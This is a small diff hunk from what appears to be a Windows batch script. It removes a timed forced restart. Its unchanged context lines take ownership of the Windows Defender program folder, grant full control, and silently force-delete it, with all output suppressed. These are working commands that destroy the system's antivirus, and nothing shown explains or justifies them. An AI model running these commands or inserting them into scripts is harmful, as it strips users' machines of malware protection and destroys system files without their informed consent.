@@ -208,6 +208,3 @@ takeown /F "C:\Program Files\Windows Defender" >nul 2>&1
 icacls "C:\Program Files\Windows Defender" /grant Administrators:F %USERNAME%:F >nul 2>&1
 del /F /Q "C:\Program Files\Windows Defender" >nul 2>&1
 rmdir /S /Q "C:\Program Files\Windows Defender" >nul 2>&1
-timeout /t 1 >nul
-shutdown /r /t 3
-timeout /t 2 >nul
